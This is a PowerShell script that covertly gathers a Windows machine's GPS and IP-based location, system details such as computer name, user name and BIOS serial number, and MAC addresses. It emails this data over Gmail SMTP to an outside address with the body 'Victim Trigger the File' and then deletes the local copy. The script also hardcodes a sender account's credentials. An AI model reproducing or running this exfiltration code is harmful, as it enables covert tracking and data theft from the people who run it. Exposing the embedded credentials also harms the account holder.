# Load the required assembly
Add-Type -AssemblyName System.Device

# Create a GeoCoordinateWatcher object
$geo = New-Object System.Device.Location.GeoCoordinateWatcher

# Start the watcher
$geo.Start()

# Wait for a few seconds to allow it to get location data
Start-Sleep -Seconds 5

# Retrieve GPS location
$latitude = $geo.Position.Location.Latitude
$longitude = $geo.Position.Location.Longitude

# Prepare output
$output = @()
$output += "=== GPS Location Data ==="
$output += "Latitude:  $latitude"
$output += "Longitude: $longitude"

# Get location using IP-based method
$output += "`n=== Fetching IP-Based Location ==="
$ipLocation = Invoke-RestMethod -Uri "https://ipinfo.io/json"
$output += "IP:          $($ipLocation.ip)"
$output += "City:        $($ipLocation.city)"
$output += "Region:      $($ipLocation.region)"
$output += "Country:     $($ipLocation.country)"

# Get system information using Get-ComputerInfo
$output += "`n=== System Information ==="
$output += (Get-ComputerInfo | Select-Object CsName, WindowsVersion, WindowsBuildLabEx, OsArchitecture, OsName, OsManufacturer, CsManufacturer, CsModel, CsSystemType, CsTotalPhysicalMemory, BiosSeralNumber, CsAdminPasswordStatus, CsUserName, TimeZone | Out-String)

# Get MAC information
$output += "`n=== MAC Information ==="
$output += (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null } | Select-Object Description, MACAddress | Out-String)

# Save to a text file
$output | Set-Content -Path "SystemInfo.txt"

# Send Mail
$From = "qrpay.69991@gmail.com"
$To = "sourav.bhaumik11@gmail.com" #sourav.bhaumik11@gmail.com
$Subject = "Info Of $($ipLocation.ip)"
$Body = "Victim Trigger the File"
$SMTPServer = "smtp.gmail.com"
$SMTPPort = 587
$Username = "qrpay.69991@gmail.com"
$Password = "cpcy fwns ihka xwuk"
$Attachment = "./SystemInfo.txt"  # Specify the file to attach

# Create a secure string for the password
$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential ($Username, $SecurePassword)

# Send the email with attachment
Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $Credential -Attachments $Attachment

# Delete file
Remove-Item -Path $Attachment -Force